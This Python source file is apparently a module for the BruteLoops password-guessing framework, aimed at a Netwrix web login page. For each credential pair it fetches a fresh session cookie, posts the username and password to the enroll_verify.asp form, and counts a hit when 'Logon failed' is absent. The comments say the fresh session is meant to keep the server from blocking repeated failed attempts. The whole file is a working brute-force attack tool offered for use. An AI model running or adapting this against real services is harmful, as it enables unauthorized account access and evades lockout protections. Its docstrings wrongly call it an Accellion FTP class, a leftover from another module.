#!/usr/bin/env python3

import requests
import re
import warnings
import pdb
from BruteLoops.example.module import Module as BLModule

warnings.filterwarnings('ignore')

# Default user agent
DEFAULT_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) ' \
             'AppleWebKit/537.36 (KHTML, like Gecko) Chr' \
             'ome/58.0.3029.110 Safari/537.36'

# Path to default landing page
#   - Assigns CRSF cookie
#   - Provides value to fc POST parameter (unknown use)
DEFAULT_LANDING = '/PM/default.asp'

# Path to where the form is posted
DEFAULT_LOGIN   = '/PM/enroll_verify.asp'

class Module(BLModule):
    '''Callable FTP class for the Accellion FTP web interface.
    '''

    name = 'http.netwrix'
    description = brief_description = 'Netwrix web login'

    def __init__(self, origin:'required:True,type:str,help:String origin URL',
            domain:'required:True,type:str,help:Domain to supply',
            landing_path:'required:False,type:str,help:Path to resource that ' \
                    'issues cookies'=DEFAULT_LANDING,
            login_path:'required:False,type:str,help:Path to where the form ' \
                    'is submitted'=DEFAULT_LOGIN,
            user_agent:'required:False,type:str,help:User agent string'= \
                    DEFAULT_UA,
            verify_ssl:'required:False,type:bool,help:Verify SSL'=False,
            *args, **kwargs):
        '''Initialize an FTP object. Parameters:

        - origin - String origin for server in the format: https://host.apex.com
        - landing_path - String path to the landing page that issues cookies/tokens
        - login_path - String path to where the auth form is submitted
        - user_agent - String of custom user agent value
        - verify_ssl - Boolean determining if SSL certificate should be checked
        '''

        self.origin=origin
        self.domain=domain
        self.landing_path=landing_path
        self.login_path=login_path
        self.landing_url=f'{origin}{landing_path}'
        self.auth_url=f'{origin}{login_path}'
        self.user_agent=user_agent
        self.verify_ssl=verify_ssl

    def __call__(self,username,password):
        '''Authentication module called for each set of credentials.
        It uses a fresh `requests.Session` object to acquire a new
        session cookie and fc value from the landing page to assure
        that server-side logic doesn't denylist a given combination of
        values due to multiple failed authentication attempts.

        - username - String username value to guess
        - password - String password value to guess
        '''

        # ====================
        # GET NECESSARY VALUES
        # ====================

        sess = requests.Session()

        # Get a CSRF-TOKEN (cookie)
        resp = sess.get(self.landing_url,
                headers={'User-Agent':self.user_agent}
            )

        if resp.status_code != 200:
            raise Exception(
                    f'Server responded with non 200: {resp.status_code}')

        # ======================
        # ATTEMPT AUTHENTICATION
        # ======================

        data={"user_name":username,"password":password,"x":0,"y":0,"domain":self.domain}

        # Encode the password
        data["user_nameU"]="FEFF;"+";".join([str(v) for v in username.encode('utf')])
        data["passwordU"]="FEFF;"+";".join([str(v) for v in password.encode('utf')])

        resp = sess.post(
                self.auth_url,
                data=data,
                verify=self.verify_ssl,
                headers={
                    'User-Agent':self.user_agent
                }
            )

        # =====================================
        # VERIFY CREDENTIALS AND RETURN OUTCOME
        # =====================================

        if resp.text.find('Logon failed') > -1:
            return (0, username, password)
        else:
            print(resp.text)
            return (1, username, password)
